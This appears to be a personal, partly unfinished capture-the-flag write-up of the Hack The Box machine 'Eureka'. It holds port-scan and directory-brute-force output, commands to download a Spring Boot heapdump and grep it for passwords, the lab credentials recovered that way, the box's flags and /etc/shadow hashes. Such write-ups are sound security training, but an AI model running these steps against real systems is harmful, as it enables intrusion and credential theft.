---
file_created: 05 Sep 2025 09:26
title: Eureka
difficulty: Hard
difficult_sort: 3
points: 0
os: Linux
target_ip: 10.10.11.66
platform: Hack The Box
category: B2R
box_status: Retired
url: https://app.hackthebox.com/machines/Eureka
user_flag: true
root_flag: true
completed: false
date_finish: 2025-09-06
tags: htb/machines
---
# Resolution summary

>[!summary]
>- Step 1
>- Step 2
## About 
- `Eureka` is a hard-difficulty Linux machine centered on `Spring Boot` microservices and service discovery misconfigurations. 
- Initial access is gained by exploiting an exposed `/actuator/heapdump` endpoint on the `Furni` web application, retrieving sensitive credentials from the memory snapshot. 
- With SSH access, deeper enumeration reveals a microservice architecture where `Furni` delegates authentication to a user-management-service, both orchestrated through a Spring Cloud Gateway and registered in Eureka. 
- The attacker abuses Eureka’s insecure registration to introduce a malicious fake `USER-MANAGEMENT-SERVICE`, tricking the gateway into routing real login traffic and capturing valid credentials.
- Privilege escalation is achieved by analyzing a root-run log analysis script, which parses HTTP status codes unsafely. 
- By injecting a crafted payload into application.log, arbitrary command execution as root is obtained, ultimately leading to complete system compromise.
## Tutorial

```cardlink
url: https://youtu.be/14X4yCgNRVQ
title: "HackTheBox - Eureka"
description: "00:00 - Introduction01:00 - Start of nmap03:45 - Discovering the default 404 page of Springboot, then using GoBuster with a Springboot wordlist to show actua..."
host: youtu.be
favicon: https://www.youtube.com/s/desktop/a7ddb0c7/img/favicon_32x32.png
image: https://i.ytimg.com/vi/14X4yCgNRVQ/maxresdefault.jpg
```
- [Write-up](<./attachments/Eureka.pdf>)
- [Lazyhackers](https://www.lazyhackers.in/posts/eureka-htb-writeup-hackthebox)
## Improved skills

- Skill 1
- Skill 2

## Used tools
- [rustscan](https://github.com/bee-san/RustScan)
- nmap
- [nuclei](https://github.com/projectdiscovery/nuclei)
- [gobuster](https://github.com/OJ/gobuster)
- burpsuite
---
# Information Gathering

## Scanned all ports:

```rust
rustscan -a 10.10.11.66 -r 1-65535 -t 10000 --ulimit 5000

Scanned at 2025-09-05 10:03:58 SAST for 1s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
8761/tcp open  unknown syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.99 seconds
```

## Enumerated open ports:

```lua
sudo nmap -sV -sC -sT -p8761,22,80 -Pn -oN nmap/open-tcp-ports.txt -vv 10.10.11.66

Scanned at 2025-09-05 10:12:25 SAST for 56s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpa5HH8lfpsh11cCkEoqcNXWPj6wh8GaDrnXst/q7zd1PlBzzwnhzez+7mhwfv1PuPf5fZ7KtZLMfVPuUzkUHVEwF0gSN0GrFcKl/D34HmZPZAsSpsWzgrE2sayZa3xZuXKgrm5O4wyY+LHNPuHDUo0aUqZp/f7SBPqdwDdBVtcE8ME/AyTeJiJrOhgQWEYxSiHMzsm3zX40ehWg2vNjFHDRZWCj3kJQi0c6Eh0T+hnuuK8A3Aq2Ik+L2aITjTy0fNqd9ry7i6JMumO6HjnSrvxAicyjmFUJPdw1QNOXm+m+p37fQ+6mClAh15juBhzXWUYU22q2q9O/Dc/SAqlIjn1lLbhpZNengZWpJiwwIxXyDGeJU7VyNCIIYU8J07BtoE4fELI26T8u2BzMEJI5uK3UToWKsriimSYUeKA6xczMV+rBRhdbGe39LI5AKXmVM1NELtqIyt7ktmTOkRQ024ZoSS/c+ulR4Ci7DIiZEyM2uhVfe0Ah7KnhiyxdMSlb0=
|   256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNqI0DxtJG3vy9f8AZM8MAmyCh1aCSACD/EKI7solsSlJ937k5Z4QregepNPXHjE+w6d8OkSInNehxtHYIR5nKk=
|   256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHNmmTon1qbQUXQdI6Ov49enFe6SgC40ECUXhF0agNVn
80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://furni.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
8761/tcp open  unknown syn-ack
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 401
|     Vary: Origin
|     Vary: Access-Control-Request-Method
|     Vary: Access-Control-Request-Headers
|     Set-Cookie: JSESSIONID=08CC05D077361A0B8367A5E7B0207DF1; Path=/; HttpOnly
|     WWW-Authenticate: Basic realm="Realm"
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 0
|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate
|     Pragma: no-cache
|     Expires: 0
|     X-Frame-Options: DENY
|     Content-Length: 0
|     Date: Fri, 05 Sep 2025 08:13:25 GMT
|     Connection: close
|   HTTPOptions:
|     HTTP/1.1 401
|     Vary: Origin
|     Vary: Access-Control-Request-Method
|     Vary: Access-Control-Request-Headers
|     Set-Cookie: JSESSIONID=12BF35C7472197401F3C37AE87F3D680; Path=/; HttpOnly
|     WWW-Authenticate: Basic realm="Realm"
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 0
|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate
|     Pragma: no-cache
|     Expires: 0
|     X-Frame-Options: DENY
|     Content-Length: 0
|     Date: Fri, 05 Sep 2025 08:13:26 GMT
|     Connection: close
|   RPCCheck:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Fri, 05 Sep 2025 08:13:28 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|     Request</h1></body></html>
|   RTSPRequest:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Fri, 05 Sep 2025 08:13:27 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1></body></html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8761-TCP:V=7.94SVN%I=7%D=9/5%Time=68BA9B76%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,1D1,"HTTP/1\.1\x20401\x20\r\nVary:\x20Origin\r\nVary:\x20Acc
SF:ess-Control-Request-Method\r\nVary:\x20Access-Control-Request-Headers\r
SF:\nSet-Cookie:\x20JSESSIONID=08CC05D077361A0B8367A5E7B0207DF1;\x20Path=/
SF:;\x20HttpOnly\r\nWWW-Authenticate:\x20Basic\x20realm=\"Realm\"\r\nX-Con
SF:tent-Type-Options:\x20nosniff\r\nX-XSS-Protection:\x200\r\nCache-Contro
SF:l:\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nPragma
SF::\x20no-cache\r\nExpires:\x200\r\nX-Frame-Options:\x20DENY\r\nContent-L
SF:ength:\x200\r\nDate:\x20Fri,\x2005\x20Sep\x202025\x2008:13:25\x20GMT\r\
SF:nConnection:\x20close\r\n\r\n")%r(HTTPOptions,1D1,"HTTP/1\.1\x20401\x20
SF:\r\nVary:\x20Origin\r\nVary:\x20Access-Control-Request-Method\r\nVary:\
SF:x20Access-Control-Request-Headers\r\nSet-Cookie:\x20JSESSIONID=12BF35C7
SF:472197401F3C37AE87F3D680;\x20Path=/;\x20HttpOnly\r\nWWW-Authenticate:\x
SF:20Basic\x20realm=\"Realm\"\r\nX-Content-Type-Options:\x20nosniff\r\nX-X
SF:SS-Protection:\x200\r\nCache-Control:\x20no-cache,\x20no-store,\x20max-
SF:age=0,\x20must-revalidate\r\nPragma:\x20no-cache\r\nExpires:\x200\r\nX-
SF:Frame-Options:\x20DENY\r\nContent-Length:\x200\r\nDate:\x20Fri,\x2005\x
SF:20Sep\x202025\x2008:13:26\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RT
SF:SPRequest,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;chars
SF:et=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435\r\nDate:\
SF:x20Fri,\x2005\x20Sep\x202025\x2008:13:27\x20GMT\r\nConnection:\x20close
SF:\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Sta
SF:tus\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"te
SF:xt/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x
SF:20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x20{font-si
SF:ze:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x20p\x2
SF:0{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px;back
SF:ground-color:#525D76;border:none;}</style></head><body><h1>HTTP\x20Stat
SF:us\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html>")%r(RPCC
SF:heck,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=ut
SF:f-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435\r\nDate:\x20Fr
SF:i,\x2005\x20Sep\x202025\x2008:13:28\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Status\x
SF:20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"text/cs
SF:s\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,
SF:\x20b\x20{color:white;background-color:#525D76;}\x20h1\x20{font-size:22
SF:px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{fon
SF:t-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px;backgroun
SF:d-color:#525D76;border:none;}</style></head><body><h1>HTTP\x20Status\x2
SF:0400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

---
# Enumeration

## Port 80 - HTTP (Apache)

```sh
echo "10.10.11.66 furni.htb" | sudo tee -a /etc/hosts
```

![](<./attachments/Eureka-3.png>)
![](<./attachments/Eureka-4.png>)
```sh
gobuster dir -u http://furni.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -o scans/p80-directories.txt -r -t 25 -q

/login                (Status: 200) [Size: 1550]
/logout               (Status: 200) [Size: 1159]
/contact              (Status: 200) [Size: 10738]
/register             (Status: 200) [Size: 9028]
/blog                 (Status: 200) [Size: 13568]
/comment              (Status: 200) [Size: 1550]
/error                (Status: 500) [Size: 73]
/shop                 (Status: 200) [Size: 12412]
/checkout             (Status: 200) [Size: 1550]
/about                (Status: 200) [Size: 14351]
/cart                 (Status: 200) [Size: 1550]
/services             (Status: 200) [Size: 14173]
/[                    (Status: 400) [Size: 0]
/plain]               (Status: 400) [Size: 0]
/]                    (Status: 400) [Size: 0]
/quote]               (Status: 400) [Size: 0]
/extension]           (Status: 400) [Size: 0]
/[0-9]                (Status: 400) [Size: 0]
```
![](<./attachments/Eureka-5.png>)
- [Info](https://0xdf.gitlab.io/cheatsheets/404#spring-boot) about error page
### Gobuster scan on spring page
```sh
gobuster dir -u http://furni.htb -w /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt
```
```txt
 Url:                     http://furni.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
actuator/caches      (Status: 200) [Size: 20]
actuator             (Status: 200) [Size: 2129]
actuator/env         (Status: 200) [Size: 6307]
actuator/env/home    (Status: 200) [Size: 668]
actuator/env/lang    (Status: 200) [Size: 668]
actuator/features    (Status: 200) [Size: 467]
actuator/env/path    (Status: 200) [Size: 668]
actuator/configprops (Status: 200) [Size: 37195]
actuator/health      (Status: 200) [Size: 15]
actuator/info        (Status: 200) [Size: 2]
actuator/metrics     (Status: 200) [Size: 3356]
actuator/refresh     (Status: 405) [Size: 114]
actuator/mappings    (Status: 200) [Size: 35560]
actuator/sessions    (Status: 400) [Size: 108]
actuator/scheduledtasks (Status: 200) [Size: 54]
actuator/beans       (Status: 200) [Size: 202253]
actuator/conditions  (Status: 200) [Size: 184221]
actuator/loggers     (Status: 200) [Size: 101592]
actuator/threaddump  (Status: 200) [Size: 106766]
Progress: 173 / 174 (99.43%)[ERROR] error on word actuator/heapdump: timeout occurred during the request
Progress: 174 / 174 (100.00%)
```
- download the heapdump
```sh
wget http://furni.htb/actuator/heapdump
```
- Read the heapdump 
```sh
strings heapdum | grep password= | less
```
```txt
{password=0sc@r190_S0l!dP@sswd, user=oscar190}!
update users set email=?,first_name=?,last_name=?,password=? where id=?!
(END)
```
- use tool JDumpSpider
```sh
java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump
```

> [!important] Creditials
> user: oscar190
> pass: 0sc@r190_S0l!dP@sswd
> 


### Nuclei
- Read about [accuator](https://www.wiz.io/blog/spring-boot-actuator-misconfigurations)
```sh
nuclei -target http://furni.htb                                                                         ─╯

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.10

                projectdiscovery.io

[INF] nuclei-templates are not installed, installing...
[INF] Successfully installed nuclei-templates at /home/rouxtronics/nuclei-templates
[WRN] Found 1 templates with syntax error (use -validate flag for further examination)
[INF] Current nuclei version: v3.4.10 (latest)
[INF] Current nuclei-templates version: v10.2.8 (latest)
[INF] New templates added in latest release: 114
[INF] Templates loaded for current scan: 8323
[INF] Executing 8121 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 202 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1782 (Reduced 1676 Requests)
[INF] Using Interactsh Server: oast.live
[missing-sri] [http] [info] http://furni.htb ["https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"]
[external-service-interaction] [http] [info] http://furni.htb
[waf-detect:nginxgeneric] [http] [info] http://furni.htb
[springboot-heapdump] [http] [critical] http://furni.htb/actuator/heapdump
[ssh-sha1-hmac-algo] [javascript] [info] furni.htb:22
[ssh-server-enumeration] [javascript] [info] furni.htb:22 ["SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.12"]
[ssh-auth-methods] [javascript] [info] furni.htb:22 ["["publickey","password"]"]
[ssh-password-auth] [javascript] [info] furni.htb:22
[openssh-detect] [tcp] [info] furni.htb:22 ["SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.12"]
[springboot-beans] [http] [low] http://furni.htb/actuator/beans
[form-detection] [http] [info] http://furni.htb
[springboot-features] [http] [low] http://furni.htb/actuator/features
[springboot-mappings] [http] [low] http://furni.htb/actuator/mappings
[fingerprinthub-web-fingerprints:openfire] [http] [info] http://furni.htb
[tech-detect:font-awesome] [http] [info] http://furni.htb
[tech-detect:bootstrap] [http] [info] http://furni.htb
[tech-detect:nginx] [http] [info] http://furni.htb
[springboot-conditions] [http] [low] http://furni.htb/actuator/conditions
[springboot-loggers] [http] [low] http://furni.htb/actuator/loggers
[http-missing-security-headers:content-security-policy] [http] [info] http://furni.htb
[http-missing-security-headers:permissions-policy] [http] [info] http://furni.htb
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://furni.htb
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://furni.htb
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://furni.htb
[http-missing-security-headers:referrer-policy] [http] [info] http://furni.htb
[http-missing-security-headers:clear-site-data] [http] [info] http://furni.htb
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://furni.htb
[http-missing-security-headers:strict-transport-security] [http] [info] http://furni.htb
[springboot-threaddump] [http] [low] http://furni.htb/actuator/threaddump
[springboot-scheduledtasks] [http] [info] http://furni.htb/actuator/scheduledtasks
[nginx-version] [http] [info] http://furni.htb ["nginx/1.18.0"]
[spring-detect] [http] [info] http://furni.htb/error
[springboot-caches] [http] [low] http://furni.htb/actuator/caches
[options-method] [http] [info] http://furni.htb ["GET,HEAD,OPTIONS"]
[springboot-actuator:available-endpoints] [http] [info] http://furni.htb/actuator ["metrics-requiredMetricName","refresh","scheduledtasks","sessions","sessions-sessionId","caches","conditions","configprops-prefix","env","features","info","configprops","loggers","sbom","sbom-id","serviceregistry","threaddump","beans","caches-cache","health","heapdump","loggers-name","mappings","metrics","self","env-toMatch","health-path"]
[springboot-env] [http] [low] http://furni.htb/actuator/env
[springboot-configprops] [http] [low] http://furni.htb/actuator/configprops
[INF] Scan completed in 5m. 37 matches found.
```
## Port 8761
`EurekaSrvr:0scarPWDisTheB3st`

![400](<./attachments/Eureka-1.png>)
>[!info] Creds
>user: EurekaSrvr
>pass: 0scarPWDisTheB3st
- `http://furni.htb:8761/`
![](<./attachments/Eureka-6.png>)
![](<./attachments/Eureka-2.png>)
```sh
gobuster dir -u http://10.10.11.66 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -o scans/p80-directories.txt -r -t 25 -q
```

---
# Creditienals
## SSH
- ssh
```sh
ssh oscar190@furni.htb
```
> [!important] Creditials
> user: oscar190
> pass: 0sc@r190_S0l!dP@sswd
> 

>[!test]
>user: miranda.wise


## Website - port 8361
>[!info] Creds
>user: EurekaSrvr
>pass: 0scarPWDisTheB3st

# Exploitation

## SQL Injection


---
# Lateral Movement to miranda-wise

## Local enumeration
- run `find . -type f`
- run [pspy](https://github.com/DominicBreuker/pspy)
![](<./attachments/Eureka-8.png>)
- `ls -al /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log`
 - To find group access `ls -al /var/www/web`
 - cd to directory `cd /var/www/web`
 ![](<./attachments/Eureka-7.png>)
  - use `getent group developers`
![](<./attachments/Eureka-9.png>)
- `grep -R miranda-wise`
`curl -u EurekaSrvr:0scarPWDisTheB3st http://10.10.11.66:8761/eureka/apps`
![](<./attachments/Eureka-10.png>)
## Lateral movement vector

---

# Privilege Escalation to xxx

## Local enumeration


## Privilege Escalation vector


---
# Trophies
## User Flag
```txt
ef73ee232c183aac30368eb080aa507f
```

## Root Flag
```txt
cf2607b535c5a290a37fbcda98aacabf
```

## **/etc/shadow**

```txt
root:$6$OBLuDSnSI6fzrKsf$u9QRtUqJYklvj0ve0W792/K0OFtjkezL5d/glicQuh.wd2Zghc5DU5AR8wy3WqSN4XE4URKuT2Q.TvVn8V6aG.:19947:0:99999:7:::
wise:$6$cceIW.FRVwHUaXms$/A4OpW8llje8ChgjPMbb81eEs.SiaivbvJyoOFtDmF9loeQ.tU3G6yMQz3B5tThwjgPr7j/XZV4TrbqQhKTif1:19936:0:99999:7:::
oscar190:$6$CCVgNnsseJFcoNGs$gzae.Om25l/QR2NNsAEeulOjuPVf.UxaTupSl.TIePjM47QM1PvPaFLY2I/BTM0kyltIHJ7MB3L8rBAnu8e501:19936:0:99999:7:::
```
---
# Proof
![](<./attachments/Eureka-11.png>)
